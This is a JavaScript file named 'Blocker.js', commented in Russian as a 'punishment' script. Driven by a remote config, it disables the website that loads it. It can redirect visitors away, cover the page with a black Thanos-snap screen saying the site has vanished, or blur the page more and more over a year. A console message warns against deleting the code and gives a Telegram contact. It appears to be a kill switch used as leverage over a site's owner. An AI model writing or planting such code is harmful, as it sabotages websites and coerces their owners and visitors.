/*!
 * Blocker.js
 * Данный скрипт отвечает за наказание.
 */

// Массив с эффектами
const effects = {
  //redirect - редирект на redirecturl
  redirect: (redirectUrl) => {
    console.log(`Применяется эффект redirect на ${redirectUrl}`);
    window.location.replace(redirectUrl);
  },
  //thanos - поверх сайта чёрный экран с gif щелком таноса
  thanos: () => {
    console.log("%cD3US Blocker\n%cПрименяется эффект %cThanos", "font-weight: bold;", "", "color: #5d96f0");
  const BlockerThanosBlackScreen = document.createElement("div");
  BlockerThanosBlackScreen.style.position = "fixed";
  BlockerThanosBlackScreen.style.top = "0";
  BlockerThanosBlackScreen.style.left = "0";
  BlockerThanosBlackScreen.style.width = "100%";
  BlockerThanosBlackScreen.style.height = "100%";
  BlockerThanosBlackScreen.style.background = "black";
  BlockerThanosBlackScreen.style.zIndex = "999999999";
  BlockerThanosBlackScreen.style.display = "flex";
  BlockerThanosBlackScreen.style.flexDirection = "column";
  BlockerThanosBlackScreen.style.alignItems = "center";
  BlockerThanosBlackScreen.style.justifyContent = "center";

  const BlockerThanosGifImage = document.createElement("img");
  BlockerThanosGifImage.src = "https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExZWZ0bWRoajlyem1lbHViczd0MzU4YnlneHQ4cGRwMmhweTFsdzZjYSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/LOoaJ2lbqmduxOaZpS/giphy.gif";
  BlockerThanosGifImage.alt = "Tanos Snap";
  BlockerThanosGifImage.style.marginBottom = "20px";

  const BlockerThanosCaption = document.createElement("p");
  BlockerThanosCaption.style.color = "white";
  BlockerThanosCaption.innerText = "Упс... Произошёл щелчок Таноса - сайт исчез...";

  BlockerThanosBlackScreen.appendChild(BlockerThanosGifImage);
  BlockerThanosBlackScreen.appendChild(BlockerThanosCaption);

  document.documentElement.appendChild(BlockerThanosBlackScreen);
  },
  blur: () => {
  console.log("%cD3US Blocker\n%cПрименяется эффект %cBlur", "font-weight: bold;", "", "color: #5d96f0");

function applyBlur(duration) {
    
    function updateBlur() {
        const currentTime = new Date();
        const elapsedTime = currentTime - new Date(DeusSiteInfo.blocker_blur_date);
        const percentage = Math.min(1, elapsedTime / duration);

        const blurAmount = 100 * percentage;
        document.body.style.filter = `blur(${blurAmount}px)`;

    }
    updateBlur();
}

const duration = 360 * 24 * 60 * 60 * 1000;
applyBlur(duration);
  },
};
    
  // Функция для проверки домена
  function checkDomain() {

    // Применение эффекта, если домен найден в списке
    const effectFunction = effects[DeusSiteInfo.blocker_effect];
    if (effectFunction) {
        effectFunction(DeusSiteInfo.blocker_redirecturl || DeusSiteInfo.blocker_date);
    }
        
    console.log(`%cD3US Blocker\n%c${DeusSiteInfo.blocker_note}, поэтому будь осторожен и не удаляй этот код. По всем вопросам пиши сюда \nMy Telegram → https://t.me/abrosxd`, "font-weight: bold;", "");
  }

// Вызов функции для проверки домена
checkDomain();
